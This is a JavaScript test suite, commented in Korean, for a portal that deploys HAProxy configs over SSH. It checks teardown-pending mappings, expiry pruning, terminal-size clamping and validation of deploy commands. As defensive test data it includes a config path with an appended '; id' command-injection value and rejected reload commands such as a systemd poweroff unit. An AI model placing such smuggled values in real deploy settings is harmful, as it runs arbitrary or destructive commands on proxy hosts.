  // 관리자가 만든(임시 아님) 매핑의 삭제가 보류되면 그것도 만료 작업이 다시 철거한다
  const pm = reg.addMapping({ protocol: 'ssh', targetHost: '10.1.1.8', targetPort: 22, proxyId: 'default', owner: 'fadm' });
  assert.equal((await call('fadm', 'DELETE', `/mappings/${pm.mapping.id}`)).status, 409);
  // 보류는 시각과 무관하다 — 사용 시각을 되살려도 다음 주기에 철거 대상이다
  reg.getMapping(m.mapping.id).lastUsedAt = new Date().toISOString();
  assert.equal((await call('fadm', 'PUT', '/config', { deploy: { validateCmd: '' } })).status, 200);
  assert.equal(exp.warnBadDeployCmds(), 0);
  const execs = [];
  dep._setDeployDepsForTest({ withSsh: async (_c, fn) => fn({ readFile: async () => 'global\n', writeFile: async () => {}, exec: async (cmd) => { execs.push(cmd); return { code: 0, stdout: '', stderr: '' }; } }) });
  try {
    assert.equal(await exp.pruneExpiredMappings(), 2);
    assert.equal(reg.getMapping(m.mapping.id), null);
    assert.equal(reg.getMapping(pm.mapping.id), null);
    assert.equal(execs[0], 'haproxy -c -f /etc/haproxy/haproxy.cfg.portal.tmp');
  } finally { dep._setDeployDepsForTest(null); }
});

/* ═══════════════ T5 정상 배포 순서 · 정규형 실행 · 운영자 값 ═══════════════ */
test('T5 배포는 정규형을 실행한다(원문 아님) · 운영자 env 값은 그대로 · 원격 출력은 줄 · 길이로 자른다', async () => {
  const runs = [];
  const fake = (codes = {}) => async (_c, fn) => { const execs = []; runs.push(execs); return fn({ readFile: async () => 'global\n', writeFile: async () => {}, exec: async (cmd) => { execs.push(cmd); const c = codes[cmd.split(' ')[0]] ?? 0; return { code: c, stdout: '', stderr: c ? Array.from({ length: 50 }, (_, i) => `[ALERT] line ${i} ${'x'.repeat(40)}`).join('\n') : '' }; } }); };
  dep._setDeployDepsForTest({ withSsh: fake() });
  try {
    const r = await dep.deployToProxy(sshDep({ reloadCmd: '  sudo  systemctl reload haproxy ', validateCmd: ' /usr/sbin/haproxy  -c -f {file} ' }), []);
    assert.equal(r.ok, true, JSON.stringify(r));
    const ex = runs[0];
    assert.equal(ex[0], '/usr/sbin/haproxy -c -f /etc/haproxy/haproxy.cfg.portal.tmp');
    assert.match(ex[1], /^cp -a \/etc\/haproxy\/haproxy\.cfg \/etc\/haproxy\/haproxy\.cfg\.bak\.[\d-]+$/);
    assert.equal(ex[2], 'mv /etc/haproxy/haproxy.cfg.portal.tmp /etc/haproxy/haproxy.cfg');
    assert.equal(ex[3], 'sudo -n systemctl reload haproxy');
    assert.equal(ex.length, 4);
    await withEnv('PROXY_RELOAD_CMD', 'docker kill -s HUP haproxy-c1', async () => {
      const r2 = await dep.deployToProxy(sshDep(), []);
      assert.equal(r2.ok, true);
      assert.equal(runs[1][runs[1].length - 1], 'docker kill -s HUP haproxy-c1', '운영자 값은 문법 없이 그대로');
    });
    dep._setDeployDepsForTest({ withSsh: fake({ haproxy: 1 }) });
    const bad = await dep.deployToProxy(sshDep(), []);
    assert.equal(bad.ok, false); assert.match(bad.reason, /^HAProxy 설정 검증 실패: /);
    assert.ok(bad.reason.split('\n').length <= dep.REMOTE_OUT_MAX_LINES, bad.reason);
    assert.ok(bad.reason.length <= dep.REMOTE_OUT_MAX_CHARS + 40); assert.match(bad.reason, /잘림/);
  } finally { dep._setDeployDepsForTest(null); }
});

/* ═══════════════ 범위 관리자 — 받은 모양 그대로 다시 보내면 403 이 아니다(반증 S-5) ═══════════════ */
test('범위 관리자가 공유 중계 서버를 화면이 받은 모양 그대로(명령 칸 없음 · deployCommands 포함) 저장해도 자동 구성 변경으로 읽지 않는다 · 빈 문자열을 보내면 변경이다', async () => {
  const f = await call('sadm', 'GET', '/proxies/full');
  const p1 = f.body.proxies.find((p) => p.id === 'p1');
  assert.ok(p1, JSON.stringify(f.body));
  assert.equal('reloadCmd' in p1.deploy, false, '앞 시험이 비웠다(키 없음)');
  const r = await call('sadm', 'POST', '/proxies', { ...p1, vcenterIds: ['vc-a'] });
  assert.equal(r.status, 200, JSON.stringify(r.body));
  const r2 = await call('sadm', 'POST', '/proxies', { ...p1, deploy: { ...p1.deploy, reloadCmd: '' } });
  assert.equal(r2.status, 403, '손대지 않은 칸을 빈 문자열로 보내면 변경으로 읽힌다 — 화면은 보내지 않는다(웹 시험이 고정)');
});

/* ═══════════════ T6 L6 — 창 크기 ═══════════════ */
test('T6 termDim — 정수 1 이상만 · 1000 으로 자른다', () => {
  const table = [[80, 80], [1, 1], [1000, 1000], [1001, 1000], [5000, 1000], [1e9, 1000], [0, null], [-1, null], [1.5, null], ['120', null], [NaN, null], [Infinity, null], [null, null], [undefined, null], [{}, null], [true, null]];
  for (const [v, want] of table) assert.equal(gw.termDim(v), want, String(v));
  assert.equal(gw.TERM_DIM_MAX, 1000);
});

test('T6 게이트웨이 — auth 의 shell 크기 · resize 의 setWindow 가 termDim 을 거친다(틀린 resize 는 무시)', async () => {
  const USER = { username: 'l6u', role: 'admin', scope: { vcenters: [], regions: [] } };
  gw._setRemoteDepsForTest({ resolveTokenUser: (t) => (t === 'tokL6' ? USER : null), sessionInfoOf: () => ({ username: 'l6u', source: 'local', sid: null, exp: Math.floor(Date.now() / 1000) + 3600 }) });
  const shells = [];
  gw._setSshDepsForTest({ Client: class extends EventEmitter {
    connect() { setImmediate(() => this.emit('ready')); }
    exec(_c, cb) { cb(new Error('no exec')); }
    shell(opts, cb) { const s = new PassThrough(); s.stderr = new PassThrough(); s.win = []; s.setWindow = (...a) => { s.win.push(a); }; shells.push({ opts, s }); cb(null, s); }
    end() { /* */ }
  } });
  class Ws extends EventEmitter {
    constructor() { super(); this.OPEN = 1; this.readyState = 1; this.bufferedAmount = 0; this.closed = null; }
    send(_d, cb) { if (cb) setImmediate(cb); }
    close(code, reason) { if (this.readyState !== 1) return; this.readyState = 3; this.closed = { code, reason }; setImmediate(() => this.emit('close')); }
    terminate() { this.close(1006, ''); }
    input(o) { this.emit('message', Buffer.from(JSON.stringify(o))); }
  }
  const waitFor = async (fn) => { for (let i = 0; i < 500; i += 1) { if (fn()) return true; await new Promise((r) => setTimeout(r, 10)); } return false; };
  const m = reg.addMapping({ protocol: 'ssh', targetHost: '10.2.2.2', targetPort: 22, proxyId: 'p2', owner: 'l6u' });
  try {
    const open = async (cols, rows) => {
      const ws = new Ws(); const n = shells.length;
      gw._handleConnectionForTest(ws, USER, { token: 'tokL6' });
      ws.input({ type: 'auth', mappingId: m.mapping.id, username: 'u', password: 'p', cols, rows });
      assert.ok(await waitFor(() => shells.length > n), '셸이 열려야 한다');
      return { ws, sh: shells[shells.length - 1] };
    };
    let { ws, sh } = await open(-1, 'abc');
    assert.equal(sh.opts.cols, 80); assert.equal(sh.opts.rows, 24);
    ws.close(1000, 'bye');
    ({ ws, sh } = await open(5000, 1.5));
    assert.equal(sh.opts.cols, 1000); assert.equal(sh.opts.rows, 24);
    ws.close(1000, 'bye');
    ({ ws, sh } = await open(120, 40));
    assert.equal(sh.opts.cols, 120); assert.equal(sh.opts.rows, 40);
    ws.input({ type: 'resize', cols: 200, rows: 1e9 });
    ws.input({ type: 'resize', cols: 'x', rows: 10 });
    ws.input({ type: 'resize', cols: 0, rows: 10 });
    ws.input({ type: 'resize', cols: -5 });
    ws.input({ type: 'resize', cols: 100, rows: 1.5 });
    ws.input({ type: 'resize', cols: 132, rows: 43 });
    await new Promise((r) => setTimeout(r, 30));
    assert.deepEqual(sh.s.win, [[1000, 200, 0, 0], [43, 132, 0, 0]], JSON.stringify(sh.s.win));
    ws.close(1000, 'bye');
  } finally { gw._setSshDepsForTest(null); gw._setRemoteDepsForTest(null); reg.removeMapping(m.mapping.id); }
});

/* ═══════════════ 반증 1회차(fix1) — 철거 보류는 한 방향 · 경로 거절도 보류 · 유닛 템플릿 · 블록에 든 보류 · 경고 요약 ═══════════════ */
// 업그레이드 전 현장의 옛 저장값은 저장 라우트가 이제 400 으로 막으므로, 등록부 캐시(= 읽어 들인 파일)에 직접 둔다
const legacyProxy = (o) => { reg.getConfig().proxies.push(o); return o; };
const rawProxy = (id) => reg.getConfig().proxies.find((p) => p.id === id);

test('R-1 철거 보류는 한 방향 — 관리자 재적용(SSH · Data Plane) · 직접 상태 쓰기 · 재프로비저닝이 되살리지 못한다 · .rdp 도 주지 않는다', async () => {
  store.snapshot = { ...store.get(), vcenters: [...store.get().vcenters, { id: 'vc-d' }, { id: 'vc-e' }] };
  legacyProxy({ id: 'p3', name: '법인C 중계', vcenterIds: ['vc-d'], proxyHost: '10.9.9.11', publicPortBase: 23000, deploy: sshDep({ reloadCmd: BAD_RELOAD }) });
  const am = reg.addMapping({ protocol: 'ssh', targetHost: '10.3.3.7', targetPort: 22, proxyId: 'p3', owner: 'op1', vcenterId: 'vc-d' });
  assert.equal(am.ok, true, JSON.stringify(am));
  const id = am.mapping.id;
  let s0 = snap();
  assert.equal((await call('op1', 'DELETE', `/mappings/${id}`)).status, 409);
  assert.equal(reg.getMapping(id).status, prov.TEARDOWN_PENDING);
  // 재현 경로: 관리자 재적용 → 예전에는 400 + 상태 'error'(보류가 풀렸다)
  const ap = await call('fadm', 'POST', `/mappings/${id}/apply`, {});
  assert.equal(ap.status, 409, JSON.stringify(ap.body));
  assert.equal(ap.body.code, prov.TEARDOWN_PENDING);
  assert.equal(reg.getMapping(id).status, prov.TEARDOWN_PENDING, '재적용이 보류를 풀면 안 된다');
  assert.equal(gw.mappingAccessIssue({ username: 'op1', role: 'operator', scope: {} }, reg.getMapping(id)), reg.MAPPING_TEARDOWN_TEXT);
  assert.equal(prov.deployMappingsFor('p3').some((x) => x.id === id), false, '다음 배포 블록에 들어가면 안 된다');
  const qc = await call('op1', 'POST', '/quick-connect', { targetHost: '10.3.3.7', targetPort: 22, protocol: 'ssh', vcenterId: 'vc-d' });
  assert.equal(qc.status, 200, JSON.stringify(qc.body));
  assert.notEqual(qc.body.mapping.id, id, 'quick-connect 가 보류 매핑을 재사용하면 안 된다');
  assertNoContact(s0, '보류 매핑 재적용');
  // 등록부 판정 하나: 보류 → 다른 상태 쓰기는 무시(false) · 보류 → 보류는 허용
  const err0 = reg.getMapping(id).error;
  assert.equal(reg.setMappingStatus(id, 'active', null), false);
  assert.equal(reg.setMappingStatus(id, 'error', 'x'), false);
  assert.equal(reg.getMapping(id).status, prov.TEARDOWN_PENDING); assert.equal(reg.getMapping(id).error, err0);
  assert.equal(reg.setMappingStatus(id, prov.TEARDOWN_PENDING, reg.MAPPING_TEARDOWN_TEXT), true);
  assert.equal(reg.setMappingStatus('no-such-id', 'active', null), false);
  // 재프로비저닝(SSH 배포 중계)도 보류 매핑을 건드리지 않는다
  s0 = snap();
  await prov.provision(reg.getMapping(id));
  assert.equal(reg.getMapping(id).status, prov.TEARDOWN_PENDING);
  assertNoContact(s0, '보류 매핑 provision');

  // 중계를 Data Plane 으로 바꾼 뒤의 재적용 · 재프로비저닝 — HAProxy(Data Plane API)에 그 포트를 다시 만들면 안 된다(상태 쓰기만 막아서는 막히지 않는다)
  const hits = [];
  const dpSrv = http.createServer((req, res) => { hits.push(`${req.method} ${req.url}`); res.writeHead(500, { 'content-type': 'application/json' }); res.end('{"message":"no"}'); });
  await new Promise((r) => dpSrv.listen(0, '127.0.0.1', r));
  try {
    rawProxy('p3').dataplane = { enabled: true, url: `http://127.0.0.1:${dpSrv.address().port}`, username: 'u', password: 'p', bindAddress: '*' };
    const ap2 = await call('fadm', 'POST', `/mappings/${id}/apply`, {});
    assert.equal(ap2.status, 409, JSON.stringify(ap2.body));
    await prov.provision(reg.getMapping(id));
    assert.deepEqual(hits, [], `보류 매핑으로 Data Plane 을 부르면 안 된다 ${JSON.stringify(hits)}`);
    assert.equal(reg.getMapping(id).status, prov.TEARDOWN_PENDING);
    // 대조: 보류가 아닌 매핑의 재적용은 Data Plane 을 부른다(계수기가 살아 있다)
    const ap3 = await call('fadm', 'POST', `/mappings/${qc.body.mapping.id}/apply`, {});
    assert.notEqual(ap3.status, 409);
    assert.ok(hits.length > 0, '대조 매핑은 Data Plane 을 불러야 한다');
  } finally {
    rawProxy('p3').dataplane = { enabled: false };
    await new Promise((r) => dpSrv.close(() => r()));
  }

  // .rdp — 아직 열린 공개 포트를 가리키는 파일을 주지 않는다(소유자 · 관리자 모두)
  const rm = reg.addMapping({ protocol: 'rdp', targetHost: '10.3.3.8', targetPort: 3389, proxyId: 'p3', owner: 'op1', vcenterId: 'vc-d' });
  const rdp0 = await fetch(`http://127.0.0.1:${web.address().port}/api/remote/rdp/${rm.mapping.id}`, { headers: { authorization: `Bearer ${TOK.op1}` } });
  assert.equal(rdp0.status, 200, '보류 전에는 받는다(대조)');
  assert.equal((await call('op1', 'DELETE', `/mappings/${rm.mapping.id}`)).status, 409);
  for (const who of ['op1', 'fadm']) {
    const r = await call(who, 'GET', `/rdp/${rm.mapping.id}`);
    assert.equal(r.status, 409, `${who}: ${JSON.stringify(r.body)}`); assert.equal(r.body.code, prov.TEARDOWN_PENDING);
  }
});

test('S-1 설정 파일 경로 거절(157회차 옛 저장값)도 접속 전 설정 거절 — 철거 보류 · 비관리자 사유에 경로 없음 · 기동 경고에 센다 · 고치면 정리', async () => {
  const before = exp.warnBadDeployCmds();
  legacyProxy({ id: 'p4', name: '법인D 중계', vcenterIds: ['vc-e'], proxyHost: '10.9.9.12', publicPortBase: 24000, deploy: sshDep({ haproxyConfigPath: '/etc/haproxy/haproxy.cfg; id' }) });
  assert.equal(exp.warnBadDeployCmds(), before + 1, '경로가 형식 밖인 중계도 센다');
  assert.ok(reg.deployConfigRefusal(rawProxy('p4').deploy));
  assert.equal(reg.deployConfigRefusal(sshDep()), null);
  const s0 = snap();
  const d = await dep.deployToProxy(rawProxy('p4').deploy, []);
  assert.equal(d.ok, false); assert.equal(d.code, dep.DEPLOY_REFUSAL_CODES.path); assert.equal(dep.isDeployConfigRefusal(d), true);
  assert.equal(dep.isDeployConfigRefusal({ ok: false, reason: '접속 실패' }), false, '일시 실패는 설정 거절이 아니다');
  assert.equal(dep.isDeployConfigRefusal({ ok: true, code: dep.DEPLOY_REFUSAL_CODES.cmd }), false);
  // 새 매핑의 프로비저닝 실패 사유(소유자가 본다)에 경로 · 명령이 없다
  const nm = reg.addMapping({ protocol: 'ssh', targetHost: '10.4.4.6', targetPort: 22, proxyId: 'p4', owner: 'op1', vcenterId: 'vc-e' });
  await prov.provision(nm.mapping);
  assert.equal(reg.getMapping(nm.mapping.id).status, 'error');
  assert.equal(reg.getMapping(nm.mapping.id).error, reg.DEPLOY_CMD_MAPPING_TEXT);
  // 삭제 — 예전: code 없는 거절을 일시 실패로 보고 등록부에서 지웠다(열린 포트 은폐)
  const del = await call('op1', 'DELETE', `/mappings/${nm.mapping.id}`);
  assert.equal(del.status, 409, JSON.stringify(del.body));
  assert.equal(del.body.reason, prov.TEARDOWN_PENDING_TEXT); assert.equal(/; id|haproxyConfigPath|경로는/.test(del.body.reason), false);
  assert.equal(reg.getMapping(nm.mapping.id).status, prov.TEARDOWN_PENDING);
  // 만료 — 임시 매핑도 지우지 않고 보류
  const em = reg.addMapping({ protocol: 'ssh', targetHost: '10.4.4.7', targetPort: 22, proxyId: 'p4', owner: 'op1', vcenterId: 'vc-e', ephemeral: true });
  reg.getMapping(em.mapping.id).lastUsedAt = new Date(Date.now() - 3 * 86_400_000).toISOString();
  await exp.pruneExpiredMappings();
  assert.equal(reg.getMapping(em.mapping.id)?.status, prov.TEARDOWN_PENDING, '만료 철거가 거절되면 남긴다');
  assertNoContact(s0, '경로 거절');
  // 관리자가 경로를 고친다 → 다음 만료 주기가 철거하고 지운다
  rawProxy('p4').deploy.haproxyConfigPath = '/etc/haproxy/haproxy.cfg';
  dep._setDeployDepsForTest({ withSsh: async (_c, fn) => fn({ readFile: async () => 'global\n', writeFile: async () => {}, exec: async () => ({ code: 0, stdout: '', stderr: '' }) }) });
  try {
    await exp.pruneExpiredMappings();
    assert.equal(reg.getMapping(em.mapping.id), null);
    assert.equal(reg.getMapping(nm.mapping.id), null);
  } finally { dep._setDeployDepsForTest(null); }
});

test('N-1 재적재 유닛 — haproxy 는 템플릿 이름(@ 앞)에 · 다른 템플릿에 인스턴스 이름만 맞춘 유닛은 거절', () => {
  for (const s of ['systemctl restart getty@haproxy', 'systemctl restart user@haproxy', 'systemctl restart serial-getty@haproxy', 'systemctl restart systemd-poweroff@haproxy.service', 'service getty@haproxy restart']) {
    const r = reg.parseDeployCmd('reloadCmd', s);
    assert.equal(r.ok, false, s); assert.match(r.issue, /@/);
  }
  for (const s of ['systemctl reload haproxy@edge', 'systemctl reload rh-haproxy18-haproxy@a.service', 'systemctl reload haproxy.service', 'service haproxy reload']) {
    assert.equal(reg.parseDeployCmd('reloadCmd', s).ok, true, s);
  }
});

test('N-3 · N-2 성공 배포는 블록에 실제로 든 보류 매핑을 지우지 않는다 · 보류 경고는 주기당 한 줄 · 거절 경고는 중계 · 칸마다 한 번', async () => {
  // N-3: 배포가 도는 사이에 보류가 된 매핑은 블록에 들어갔다(listen 이 열려 있다) — 지우면 열린 포트가 화면에서 사라진다
  const a = reg.addMapping({ protocol: 'ssh', targetHost: '10.3.3.20', targetPort: 22, proxyId: 'p3', owner: 'op1', vcenterId: 'vc-d' }).mapping;
  const b = reg.addMapping({ protocol: 'ssh', targetHost: '10.3.3.21', targetPort: 22, proxyId: 'p3', owner: 'op1', vcenterId: 'vc-d' }).mapping;
  for (const m of [a, b]) reg.setMappingStatus(m.id, prov.TEARDOWN_PENDING, reg.MAPPING_TEARDOWN_TEXT);
  prov.finishSshDeploy('p3', [reg.getMapping(a.id)]);
  assert.equal(reg.getMapping(a.id)?.status, prov.TEARDOWN_PENDING, '블록에 든 보류 매핑은 남는다');
  assert.equal(reg.getMapping(b.id), null, '블록에 없던 보류 매핑은 닫혔으니 지운다');
  // N-2: 보류 매핑 여럿(p3 — 재적재 명령 형식 밖)의 만료 주기
  for (let i = 0; i < 3; i += 1) reg.addMapping({ protocol: 'ssh', targetHost: `10.3.3.${30 + i}`, targetPort: 22, proxyId: 'p3', owner: 'op1', vcenterId: 'vc-d', ephemeral: true });
  for (const m of reg.listMappings().filter((x) => x.proxyId === 'p3' && x.ephemeral)) m.lastUsedAt = new Date(Date.now() - 3 * 86_400_000).toISOString();
  const heldCount = () => reg.listMappings().filter((x) => x.proxyId === 'p3' && x.status === prov.TEARDOWN_PENDING).length;
  const lines = [];
  const orig = console.warn;
  dep._resetRefusalWarnForTest();
  console.warn = (...x) => { lines.push(x.join(' ')); };
  try {
    await exp.pruneExpiredMappings();
    await exp.pruneExpiredMappings();
    // 같은 중계(호스트)라도 다른 칸의 거절은 따로 알린다(가려지면 안 된다)
    assert.equal((await dep.deployToProxy(sshDep({ haproxyConfigPath: '/etc/haproxy/x y.cfg' }), [])).code, dep.DEPLOY_REFUSAL_CODES.path);
  } finally { console.warn = orig; }
  assert.equal(lines.filter((l) => l.includes('HAProxy 자동 배포 거절') && l.includes('haproxyConfigPath')).length, 1, JSON.stringify(lines));
  assert.ok(heldCount() >= 4, String(heldCount()));
  const summary = lines.filter((l) => l.includes('매핑 철거 보류'));
  assert.equal(summary.length, 2, `주기당 한 줄: ${JSON.stringify(summary)}`);
  assert.match(summary[1], new RegExp(`보류 ${heldCount()}건`));
  const refusals = lines.filter((l) => l.includes('HAProxy 자동 배포 거절') && l.includes('reloadCmd'));
  assert.equal(refusals.length, 1, `같은 중계 · 같은 칸의 거절 경고는 한 번: ${JSON.stringify(refusals)}`);
});
